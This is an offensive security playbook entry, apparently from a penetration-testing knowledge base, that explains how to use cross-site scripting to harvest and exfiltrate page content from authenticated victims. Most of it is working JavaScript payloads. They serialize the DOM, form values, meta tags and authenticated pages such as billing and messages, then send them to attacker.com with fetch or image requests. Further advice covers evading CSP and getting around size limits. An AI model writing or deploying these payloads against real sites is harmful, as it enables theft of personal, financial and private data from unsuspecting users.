# XSS — Data Exfiltration

## When this applies

The page renders sensitive data (PII, financial records, private messages, API tokens embedded in scripts) that the attacker wants to harvest from authenticated victims. Distinct from cookie/session theft: the goal here is content, not credentials.

## Technique

Walk the DOM and serialize:
- Full HTML (`document.documentElement.outerHTML`)
- All forms with field values (pre-filled name/email/payment data)
- All visible text (`document.body.innerText`)
- All script `src` URLs (often reveal API endpoints, internal subdomains)
- All `<meta>` tags (CSRF tokens, app version, build IDs)

POST the JSON blob to attacker server.

## Steps

### Comprehensive Data Extraction

```javascript
<script>
// Extract all sensitive data from page
var data = {
    // Page content
    html: document.documentElement.outerHTML,

    // All forms and their data
    forms: [],

    // All visible text
    bodyText: document.body.innerText,

    // API tokens in scripts
    scripts: [],

    // Meta information
    meta: {}
};

// Extract form data
document.querySelectorAll('form').forEach(form => {
    var formData = {
        action: form.action,
        method: form.method,
        fields: []
    };

    form.querySelectorAll('input, textarea, select').forEach(field => {
        formData.fields.push({
            name: field.name,
            type: field.type,
            value: field.value
        });
    });

    data.forms.push(formData);
});

// Extract script sources
document.querySelectorAll('script').forEach(script => {
    if(script.src) {
        data.scripts.push(script.src);
    }
});

// Extract meta tags
document.querySelectorAll('meta').forEach(meta => {
    var name = meta.getAttribute('name') || meta.getAttribute('property');
    var content = meta.getAttribute('content');
    if(name && content) {
        data.meta[name] = content;
    }
});

// Exfiltrate
fetch('https://attacker.com/exfil', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify(data)
});
</script>
```

### Targeted Element Exfiltration

```javascript
// Specific selector when full page is too large
let sensitiveData = document.querySelector('.user-profile').innerHTML;
fetch('https://attacker.com?data='+btoa(sensitiveData));
```

### Multi-Page Crawl + Exfiltrate

```javascript
// Authenticated GET → harvest → exfil
const targets = ['/account', '/billing', '/api/users/me', '/messages'];
Promise.all(targets.map(u => fetch(u).then(r => r.text()))).then(pages => {
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({pages: pages, urls: targets})
    });
});
```

## Verifying success

- Attacker endpoint receives JSON containing recognizable victim data (name, email, account ID).
- Form fields show pre-filled values (autofilled or server-rendered) for sensitive fields.
- Script URLs reveal internal APIs not documented publicly.
- Meta tags include CSRF tokens or version markers usable for follow-up exploitation.

## Common pitfalls

1. **Payload size limit** — `document.documentElement.outerHTML` can be MBs; chunk or compress (`btoa(LZString.compress(html))`).
2. **`fetch` body size and POST limits** — some attacker endpoints / WAFs cap body size; chunk into multiple requests.
3. **CSP `connect-src 'self'`** — `fetch` to attacker.com is blocked. Use `<img>` GET with chunked URLs, or look for trusted domains in the policy.
4. **SPA hydration** — DOM may not be fully populated when XSS fires; wait for `DOMContentLoaded` or specific framework signal.
5. **Async data not yet loaded** — set `setTimeout(exfil, 5000)` or hook into XHR/fetch responses to capture data as it arrives.

## Tools

- **`btoa` / `LZString` / `pako`** — encode and compress before exfil
- **`fetch` with `no-cors`** — fire-and-forget POST regardless of CORS
- **`<img src=https://attacker.com?d=…>`** — GET-based fallback when CSP blocks `connect-src`
- **Burp Collaborator** — capture raw exfiltration body
- **`navigator.sendBeacon`** — flush before unload
